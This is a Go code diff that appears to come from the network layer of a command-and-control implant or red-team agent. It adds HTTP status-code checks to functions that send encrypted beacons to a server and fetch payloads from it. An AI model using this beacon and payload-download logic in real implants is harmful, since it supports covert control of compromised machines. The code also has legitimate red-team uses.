@@ -67,23 +67,25 @@ func checkValidHTTPTarget(address string, fatal bool) (bool, error) {
 
 func requestHTTPPayload(address string) ([]byte, string, error) {
 	valid, err := checkValidHTTPTarget(address, false)
-	if  valid {
-		body, _, err := request(address, "GET", []byte{})
-		return body, path.Base(address), err
+	if valid {
+		body, _, code, err := request(address, "GET", []byte{})
+		if code == 200 {
+			return body, path.Base(address), err
+		}
 	}
 	return nil, "", err
 }
 
 func beaconPOST(address string, beacon util.Beacon) []byte {
 	data, _ := json.Marshal(beacon)
-	body, _, _ := request(address, "POST", util.Encrypt(data))
-	if len(body) > 0 {
+	body, _, code, err := request(address, "POST", util.Encrypt(data))
+	if len(body) > 0 && code == 200 && err == nil {
 		return []byte(util.Decrypt(string(body)))
 	}
 	return body
 }
 
-func request(address string, method string, data []byte) ([]byte, http.Header, error) {
+func request(address string, method string, data []byte) ([]byte, http.Header, int, error) {
 	client := &http.Client{}
 	req, err := http.NewRequest(method, address, bytes.NewBuffer(data))
 	if err != nil {
@@ -94,17 +96,17 @@ func request(address string, method string, data []byte) ([]byte, http.Header, e
 	resp, err := client.Do(req)
 	if err != nil {
 		log.Print(err)
-		return nil, nil, err
+		return nil, nil, 404, err
 	}
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
 		log.Print(err)
-		return nil, nil, err
+		return nil, nil, resp.StatusCode, err
 	}
 	err = resp.Body.Close()
 	if err != nil {
 		log.Print(err)
-		return nil, nil, err
+		return nil, nil, resp.StatusCode, err
 	}
-	return body, resp.Header, err
+	return body, resp.Header, resp.StatusCode, err
 }
